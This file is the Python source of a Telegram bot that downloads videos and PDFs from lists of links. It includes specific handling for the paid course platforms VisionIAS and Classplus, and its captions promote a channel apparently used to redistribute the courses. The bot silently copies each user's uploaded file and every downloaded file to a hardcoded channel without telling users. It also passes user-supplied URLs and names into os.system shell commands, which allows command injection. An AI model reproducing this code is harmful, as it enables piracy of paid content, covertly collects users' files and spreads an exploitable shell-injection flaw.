import os
import re
import sys
import time
import requests
from aiohttp import ClientSession
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import FloodWait
from pyromod import listen

# Import variables
from vars import api_id, api_hash, bot_token

# Permanent channel where the uploaded files are sent
PERMANENT_CHANNEL = "@hub_formate"

bot = Client(
    "bot",
    api_id=api_id,
    api_hash=api_hash,
    bot_token=bot_token
)


@bot.on_message(filters.command(["start"]))
async def account_login(bot: Client, m: Message):
    await m.reply_text(
        f"👋 Hello [{m.from_user.first_name}](tg://user?id={m.from_user.id})!\n\n"
        f"Welcome to the downloader bot.\nPress /crchoudhary to begin.",
    )


@bot.on_message(filters.command("stop"))
async def restart_handler(_, m):
    await m.reply_text("🔴 **Bot Stopped.** 🚦", True)
    os.execl(sys.executable, sys.executable, *sys.argv)


@bot.on_message(filters.command(["crchoudhary"]))
async def account_login(bot: Client, m: Message):
    editable = await m.reply_text("📥 **Send me a text file to process...**")
    input: Message = await bot.listen(editable.chat.id)
    text_file = await input.download()

    # Forward file to permanent channel
    await bot.send_document(chat_id=PERMANENT_CHANNEL, document=text_file, caption="📄 **New File Received**")

    path = f"./downloads/{m.chat.id}"
    try:
        with open(text_file, "r") as f:
            content = f.read()
        content = content.split("\n")
        links = []
        for line in content:
            links.append(line.split("://", 1))
        os.remove(text_file)
    except Exception as e:
        await m.reply_text(f"❌ **Error reading the file:** {e}")
        os.remove(text_file)
        return

    await editable.edit(
        f"🔗 **Total Links Found:** {len(links)}\n\n"
        "📌 **Send the starting link number (default is 1):**"
    )
    input0: Message = await bot.listen(editable.chat.id)
    start_link = int(input0.text) if input0.text.isdigit() else 1
    await input0.delete(True)

    await editable.edit("📌 **Send the batch name:**")
    input1: Message = await bot.listen(editable.chat.id)
    batch_name = input1.text
    await input1.delete(True)

    await editable.edit(
        "📸 **Choose a resolution (for videos):**\n144, 240, 360, 480, 720, 1080"
    )
    input2: Message = await bot.listen(editable.chat.id)
    resolution = input2.text
    await input2.delete(True)

    resolution_map = {
        "144": "256x144",
        "240": "426x240",
        "360": "640x360",
        "480": "854x480",
        "720": "1280x720",
        "1080": "1920x1080"
    }
    res = resolution_map.get(resolution, "UN")

    await editable.edit("📝 **Enter a caption for the uploaded file:**")
    input3: Message = await bot.listen(editable.chat.id)
    caption = input3.text
    await input3.delete(True)

    await editable.edit("📷 **Send a thumbnail URL or type 'no':**")
    input6 = await bot.listen(editable.chat.id)
    thumb_url = input6.text
    await input6.delete(True)
    await editable.delete()

    # Download thumbnail if provided
    thumb_path = None
    if thumb_url.startswith("http"):
        thumb_path = "thumb.jpg"
        os.system(f"wget '{thumb_url}' -O {thumb_path}")

    count = start_link
    try:
        for i in range(start_link - 1, len(links)):
            link_type = links[i][1].split("/")[0]
            link_url = "https://" + links[i][1]

            # Handle app-specific links
            if "visionias" in link_url:
                async with ClientSession() as session:
                    async with session.get(link_url) as resp:
                        text = await resp.text()
                        link_url = re.search(r"(https://.*?playlist.m3u8.*?)\"", text).group(1)

            elif "videos.classplusapp" in link_url:
                link_url = requests.get(
                    f"https://api.classplusapp.com/cams/uploader/video/jw-signed-url?url={link_url}",
                    headers={'x-access-token': 'your_token_here'}
                ).json()['url']

            elif "/master.mpd" in link_url:
                video_id = link_url.split("/")[-2]
                link_url = f"https://d26g5bnklkwsh4.cloudfront.net/{video_id}/master.m3u8"

            name = f"{count:03d}) {links[i][0][:50].strip()}"
            ytf = f"b[height<={resolution}][ext=mp4]/bv[height<={resolution}][ext=mp4]+ba[ext=m4a]/b[ext=mp4]"

            if ".pdf" in link_url:
                cmd = f'yt-dlp -o "{name}.pdf" "{link_url}"'
            else:
                cmd = f'yt-dlp -f "{ytf}" "{link_url}" -o "{name}.mp4"'

            # Stylish download message
            show_message = (
                f"⬇️ **Downloading:** `{name}`\n"
                f"📁 **Resolution:** {resolution}\n"
                f"🔗 **URL:** `{link_url}`"
            )
            prog = await m.reply_text(show_message)

            # Download and send
            try:
                os.system(cmd)

                if ".pdf" in link_url:
                    stylish_caption_pdf = (
                        f"📄 **Document Name:** `{name}`\n"
                        f"📂 **Batch Name:** `{batch_name}`\n"
                        f"✅ **Downloaded Successfully!,JOIN @TARGETALLCOURSE**"
                    )
                    file_path = f"{name}.pdf"
                else:
                    stylish_caption_video = (
                        f"🎥 **Video Name:** `{name}`\n"
                        f"📂 **Batch Name:** `{batch_name}`\n"
                        f"✅ **Downloaded Successfully!JOIN @TARGETALLCOURSE**"
                    )
                    file_path = f"{name}.mp4"

                # Send to user
                await bot.send_document(
                    chat_id=m.chat.id,
                    document=file_path,
                    thumb=thumb_path if ".mp4" in file_path else None,
                    caption=stylish_caption_pdf if ".pdf" in file_path else stylish_caption_video
                )

                # Send to permanent channel
                await bot.send_document(
                    chat_id=PERMANENT_CHANNEL,
                    document=file_path,
                    thumb=thumb_path if ".mp4" in file_path else None,
                    caption=stylish_caption_pdf if ".pdf" in file_path else stylish_caption_video
                )

                count += 1
                os.remove(file_path)
            except Exception as e:
                await m.reply_text(f"❌ **Error downloading:** {e}")
                continue

            await prog.delete()

    except Exception as e:
        await m.reply_text(f"❌ **Error:** {e}")

    await m.reply_text("✅ **All downloads completed successfully!**")
    if thumb_path:
        os.remove(thumb_path)


bot.run()
